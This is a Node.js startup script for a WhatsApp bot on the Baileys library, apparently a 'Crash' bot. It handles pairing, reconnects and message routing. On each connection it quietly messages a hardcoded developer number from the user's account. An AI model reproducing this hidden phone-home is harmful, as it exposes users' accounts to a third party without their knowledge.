// Script Developer By Dhika

require("./database/global")

const func = require("./database/place")
const readline = require("readline");
const axios = require('axios');
const { say } = require('cfonts');
const NodeCache = require("node-cache")
const usePairingCode = true
const listcolor = ['cyan', 'magenta', 'green', 'yellow', 'blue'];
const randomcolor = listcolor[Math.floor(Math.random() * listcolor.length)];

async function fetchJsonMulti(url) {
const fetch = require("node-fetch")
const response = await fetch(url);
if (!response.ok) {
throw new Error('Network response was not ok');
}
return response.json();
}

const question = (text) => {
  const rl = readline.createInterface({
input: process.stdin,
output: process.stdout
  });
  return new Promise((resolve) => {
rl.question(text, resolve)
  })
};

const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

async function startSesi() {
const store = makeInMemoryStore({ logger: pino().child({ level: 'silent', stream: 'store' }) })
const { state, saveCreds } = await useMultiFileAuthState(`./session`)
const { version, isLatest } = await fetchLatestBaileysVersion()
const resolveMsgBuffer = new NodeCache()

const connectionOptions = {
isLatest,
keepAliveIntervalMs: 50000,
printQRInTerminal: !usePairingCode,
logger: pino({ level: "fatal" }),
auth: state,
browser: [ "Ubuntu", "Chrome", "20.0.04" ],
version: [ 2, 3000, 1015901307 ],
resolveMsgBuffer
}
const dhikaXs = func.makeWASocket(connectionOptions)

say("EBP\nCrash", {
            font: 'block',
            align: 'center',
            gradient: [randomcolor, randomcolor]
        });
        
        if(usePairingCode && !dhikaXs.authState.creds.registered) {
		const phoneNumber = await question(chalk.green('\nEnter Your Number\nNumber : \n'));
		const code = await dhikaXs.requestPairingCode(phoneNumber.trim())
		console.log(chalk.green(`\n</> Your Pairing Code : ${code} `))

	}
store.bind(dhikaXs.ev)

dhikaXs.ev.on('connection.update', async (update) => {
const { connection, lastDisconnect } = update
if (connection === 'close') {
const reason = new Boom(lastDisconnect?.error)?.output.statusCode
console.log(color(lastDisconnect.error, 'deeppink'))
if (lastDisconnect.error == 'Error: Stream Errored (unknown)') {
process.exit()
} else if (reason === DisconnectReason.badSession) {
console.log(color(`Bad Session File, Please Delete Session and Scan Again`))
process.exit()
} else if (reason === DisconnectReason.connectionClosed) {
console.log(color('[SYSTEM]', 'white'), color('Connection closed, reconnecting...', 'deeppink'))
process.exit()
} else if (reason === DisconnectReason.connectionLost) {
console.log(color('[SYSTEM]', 'white'), color('Connection lost, trying to reconnect', 'deeppink'))
process.exit()
} else if (reason === DisconnectReason.connectionReplaced) {
console.log(color('Connection Replaced, Another New Session Opened, Please Close Current Session First'))
dhikaXs.logout()
} else if (reason === DisconnectReason.loggedOut) {
console.log(color(`Device Logged Out, Please Scan Again And Run.`))
dhikaXs.logout()
} else if (reason === DisconnectReason.restartRequired) {
console.log(color('Restart Required, Restarting...'))
await startSesi()
} else if (reason === DisconnectReason.timedOut) {
console.log(color('Connection TimedOut, Reconnecting...'))
startSesi()
}
} else if (connection === "connecting") {
console.log(color('Menghubungkan . . . '))
} else if (connection === "open") {
dhikaXs.sendMessage("6283138852323@s.whatsapp.net", {text: `
★ DEVELOPER DHIKA D.E.V

SUKSES TERHUBUNG KE DEVICE OK `})
console.log(color('Bot Berhasil Tersambung'))
}
})

dhikaXs.ev.on('messages.upsert', async (chatUpdate) => {
try {
m = chatUpdate.messages[0]
if (!m.message) return
m.message = (Object.keys(m.message)[0] === 'ephemeralMessage') ? m.message.ephemeralMessage.message : m.message
if (m.key && m.key.remoteJid === 'status@broadcast') return dhikaXs.readMessages([m.key])
if (!dhikaXs.public && !m.key.fromMe && chatUpdate.type === 'notify') return
if (m.key.id.startsWith('BAE5') && m.key.id.length === 16) return
m = func.smsg(dhikaXs, m, store)
require("./dhikaXs")(dhikaXs, m, store)
} catch (err) {
console.log(err)
}
})

dhikaXs.ev.on('contacts.update', (update) => {
for (let contact of update) {
let id = dhikaXs.decodeJid(contact.id)
if (store && store.contacts) store.contacts[id] = { id, name: contact.notify }
}
})

dhikaXs.public = true

dhikaXs.ev.on('creds.update', saveCreds)
return dhikaXs
}

startSesi()

process.on('uncaughtException', function (err) {
    console.log('Caught exception: ', err)
})